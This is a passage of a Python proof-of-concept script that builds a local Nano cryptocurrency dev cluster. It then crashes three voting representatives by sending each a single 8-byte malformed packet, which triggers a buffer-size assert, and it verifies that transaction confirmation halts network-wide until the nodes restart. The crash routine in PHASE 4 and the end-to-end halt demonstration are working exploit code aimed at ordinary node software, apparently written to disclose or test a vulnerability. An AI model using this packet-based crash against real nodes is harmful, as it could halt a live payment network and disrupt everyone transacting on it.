
def block_on_node(node, h):
    try:
        rpc(node, action="block_info", hash=h)
        return True
    except Exception:
        return False

def wait_block_on_node(node, h, timeout=70):
    # Wait until the funding send (and its predecessors) are present in this node's
    # ledger; nudge propagation via republish-from-obs and bootstrap-from-obs.
    end = time.time() + timeout
    while time.time() < end:
        if block_on_node(node, h):
            return True
        try: rpc("obs", action="republish", hash=h, count=str(len(NODES) + 2))
        except Exception: pass
        try: rpc(node, action="bootstrap", address="::1", port=str(NODES["obs"][0]))
        except Exception: pass
        time.sleep(1.5)
    return block_on_node(node, h)

def teardown():
    for n in list(procs): stop(n)

def fail(msg):
    hr(); log(f"RESULT: FAIL — {msg}"); hr(); teardown(); sys.exit(1)

def main():
    global genesis_account
    if not os.path.exists(NANO_NODE):
        fail(f"nano_node not built at {NANO_NODE} (run: cmake --build build --target nano_node)")
    if os.path.exists(RUN): shutil.rmtree(RUN)
    os.makedirs(RUN, exist_ok=True)

    hr(); log("PHASE 1 — launch 5-node dev cluster (1 observer + 4 reps)"); hr()
    # Best-effort: kill stray daemons from a previous failed run that may still
    # be holding our peering/RPC ports (a port clash makes nano_node exit on start).
    try:
        subprocess.run(["pkill", "-f", "_net_halt_cluster"], check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
    except Exception:
        pass
    for n in NODES: start(n)
    for n in NODES:
        if not rpc_up(n):
            log(f"  {n}: RPC did NOT come up (process {'EXITED' if died(n) else 'alive but unresponsive'})")
            dump_log(n)
            fail(f"{n} RPC did not come up (see {n}.log tail above)")
        log(f"  {n}: RPC :{NODES[n][1]}  peering :{NODES[n][0]}  voting={NODES[n][3] or '-'}")

    # Build a full peering mesh via keepalive RPC, then verify connections before funding
    # (blocks only propagate to peers; without this the reps never see the funding sends).
    log("  establishing peering mesh via keepalive…")
    if not wait_peered():
        for n in NODES:
            log(f"    {n}: {peer_count(n)} peers"); dump_log(n, 12)
        fail("nodes did not peer")
    log("  peering: " + ", ".join(f"{n}={peer_count(n)}" for n in NODES))

    wallets["obs"] = rpc("obs", action="wallet_create")["wallet"]
    genesis_account = rpc("obs", action="wallet_add", wallet=wallets["obs"], key=GENESIS_PRIV)["account"]
    log(f"  genesis account: {genesis_account}")

    hr(); log("PHASE 2 — create rep accounts, distribute weight from genesis"); hr()
    reps = [n for n in NODES if NODES[n][3]]
    # Generate a key per rep (NOT in any wallet yet, so the wallet's confirmation-gated
    # auto-receive can't race us) and issue the funding sends.
    keys, sends = {}, {}
    for n in reps:
        k = rpc(n, action="key_create"); keys[n] = k; rep_accounts[n] = k["account"]
        sends[n] = send(genesis_account, rep_accounts[n], NODES[n][3])

    # Break the bootstrap deadlock: open each rep account DIRECTLY, signing with its key
    # (block_create type=state, previous=0, representative=self, link=funding send).
    # `process` only needs the send PRESENT in the rep's ledger (no confirmation), so the
    # rep gets its weight without anything having to confirm first.
    for n in reps:
        if not wait_block_on_node(n, sends[n]):
            dump_log(n); fail(f"funding send for {n} never reached its node")
        bc = rpc(n, action="block_create", json_block="true", type="state",
                 key=keys[n]["private"], account=rep_accounts[n], previous="0",
                 representative=rep_accounts[n], balance=str(NODES[n][3] * NANO), link=sends[n])
        rpc(n, action="process", json_block="true", block=bc["block"])
        log(f"  {n}: opened {NODES[n][3]:,} NANO")

    # Now add each key to its node's wallet so the node VOTES with that weight.
    for n in reps:
        wallets[n] = rpc(n, action="wallet_create")["wallet"]
        rpc(n, action="wallet_add", wallet=wallets[n], key=keys[n]["private"])

    log("  waiting for reps to come online…")
    end = time.time() + 90
    while time.time() < end and online_nano() < 295_000_000: time.sleep(2)
    log(f"  online voting weight: {online_nano():,} NANO")
    if online_nano() < 250_000_000:
        for n in reps: dump_log(n)
        fail(f"reps did not come online (got {online_nano():,} NANO)")

    hr(); log("PHASE 3 — baseline: confirm a transaction with FULL quorum"); hr()
    landing = "nano_1111111111111111111111111111111111111111111111111111hifc8npp"
    t1 = send(genesis_account, landing, 1)
    if not wait_confirm("obs", t1, 60, True): fail("T1 did not confirm with full quorum")
    log(f"  T1 {t1[:18]}… CONFIRMED with full quorum  ✓")

    hr(); log("PHASE 4 — fire ONE 8-byte packet at a quorum of reps (R1,R2,R3)"); hr()
    for v in VICTIMS:
        sent = False
        for host in ("::1", "127.0.0.1"):   # peering listener binds IPv6; fall back to v4
            try:
                s = socket.create_connection((host, NODES[v][0]), timeout=5)
                s.sendall(ATTACK_PACKET)        # only the 8-byte header
                s.close()
                log(f"  sent {ATTACK_PACKET.hex()} -> {v} ({host}:{NODES[v][0]})")
                sent = True
                break
            except Exception:
                continue
        if not sent:
            log(f"  send to {v} FAILED on both ::1 and 127.0.0.1")
    time.sleep(6)
    dead = [v for v in VICTIMS if died(v)]
    for v in VICTIMS:
        tag = "read buffer size mismatch" if log_has(v, "read buffer size mismatch") else ("exited" if v in dead else "ALIVE?!")
        log(f"  {v}: {'DOWN' if v in dead else 'up'}  ({tag})")
    if len(dead) != len(VICTIMS): fail(f"only {len(dead)}/{len(VICTIMS)} reps crashed")
    log(f"  online voting weight now: {online_nano():,} NANO  (was ~300M)")

    hr(); log("PHASE 5 — confirmations HALT: new tx cannot reach quorum"); hr()
    t2 = send(genesis_account, landing, 1)
    if confirmed("obs", t2): fail("T2 confirmed despite crashed quorum")
    if wait_confirm("obs", t2, 45, True): fail("T2 eventually confirmed while quorum down")
    log(f"  T2 {t2[:18]}… UNCONFIRMED after 45s  ✓  (R4=30M < 40.2M delta floor → quorum lost)")

    hr(); log("PHASE 6 — restart crashed reps; confirmations RESUME"); hr()
    for v in VICTIMS: start(v)
    for v in VICTIMS:
        if not rpc_up(v): fail(f"{v} did not restart")
    # Re-establish the peer mesh (preconfigured_peers can't, and the restarted reps
    # must rejoin and bootstrap the ledger before their weight counts again).
    log("  re-peering restarted reps via keepalive…")
    wait_peered()
    log("  peering: " + ", ".join(f"{n}={peer_count(n)}" for n in NODES))
    end = time.time() + 90
    while time.time() < end and online_nano() < 250_000_000: time.sleep(1)
    log(f"  online voting weight recovered: {online_nano():,} NANO")
    try: rpc("obs", action="republish", hash=t2)
    except Exception: pass
    if not wait_confirm("obs", t2, 60, True): fail("T2 did not confirm after reps restarted")
    log("  T2 CONFIRMED after restart  ✓  (confirmations resumed)")

    hr()
    log("RESULT: PASS — end-to-end chain halt demonstrated:")
    log("  • T1 confirmed with full quorum")
    log("  • 3 reps crashed by one 8-byte packet each (release_assert abort)")
    log("  • T2 could not confirm while quorum was down (network halt)")
    log("  • T2 confirmed once reps restarted (resume) — halt caused solely by the crash")
    hr(); teardown()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback; traceback.print_exc(); teardown(); sys.exit(1)
```
